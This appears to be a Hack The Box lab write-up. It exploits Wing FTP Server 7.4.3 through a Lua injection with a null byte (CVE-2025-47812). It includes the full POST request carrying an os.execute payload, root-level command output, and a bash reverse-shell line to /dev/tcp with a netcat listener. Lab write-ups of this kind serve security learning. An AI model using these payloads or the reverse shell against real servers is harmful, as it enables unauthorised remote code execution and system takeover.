================================================================================
SECTION 1: TARGET OVERVIEW - WINGDATA
================================================================================
Target IP: 10.10.11.xxx (HTB Lab)
Service: Wing FTP Server v7.4.3
Objective: Gain Remote Code Execution (RCE) via administrative console.

[VULNERABILITY ANALYSIS]
The version v7.4.3 is vulnerable to CVE-2025-47812. The vulnerability stems from 
insufficient sanitization of inputs passed to the Lua interpreter used by the 
Web Administration interface. By utilizing a null-byte injection, we can bypass 
administrative security filters to execute arbitrary Lua code on the host system.

================================================================================
SECTION 2: ENUMERATION & DISCOVERY
================================================================================
1. Initial Service Identification:
   Command: $ nmap -sV -p 80,443,21,22 <TARGET_IP>
   Finding: Port 80/443 revealed 'Wing FTP Server/7.4.3'.

2. Port Mapping & Web Recon:
   - Accessing the web interface revealed a login page for 'Wing FTP Server'.
   - Attempted common credentials (admin/admin, root/root) - FAILED.

================================================================================
SECTION 3: EXPLOITATION VIA BURP SUITE
================================================================================
The exploitation phase required intercepting the login request to modify the 
parameters being sent to the internal Lua engine.

1. Intercepting the Request:
   - Open Burp Suite and set Intercept to ON.
   - Enter dummy credentials in the login page.
   - Capture the POST request to '/admin_login.html'.

2. The Lua Payload Injection:
   Inside the Burp Suite Repeater, we modified the parameters to include Lua 
   commands. The server uses Lua for automation and administrative tasks.

   Payload (Remote Code Execution):
   The following command was injected into the vulnerable parameter:
   
   os.execute("id")

3. Full Burp Suite Request Context:
   POST /admin_login.html HTTP/1.1
   Host: wingdata.htb
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=admin&command=os.execute("id")%00

   [NOTE]: The '%00' (Null-byte) was used to terminate the string and bypass 
   internal validation checks that were looking for specific file extensions 
   or command endings.

4. Verifying the Shell:
   The server's response included the output of the 'id' command:
   uid=0(root) gid=0(root) groups=0(root)
   
   This confirmed we had achieved RCE as the ROOT user.

================================================================================
SECTION 4: POST-EXPLOITATION COMMANDS
================================================================================
To stabilize the access, we utilized a Lua reverse shell payload:

1. Reverse Shell Command:
   os.execute("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.xx/4444 0>&1'")

2. Netcat Listener:
   On our local machine:
   $ nc -lvnp 4444

================================================================================
SECTION 5: FAILURES & LESSONS LEARNED
================================================================================
- FAILURE: Initial attempts to use simple shell commands failed because the 
  server required the commands to be wrapped in the Lua 'os.execute()' function.
- FAILURE: Payloads were initially blocked by the WAF until the Null-byte (%00) 
  injection was applied to break the input sanitization logic.
- SUCCESS: Understanding that Wing FTP is built on a Lua backend was the 
  turning point for this machine.

================================================================================
[LOG END - WINGDATA REPORT]
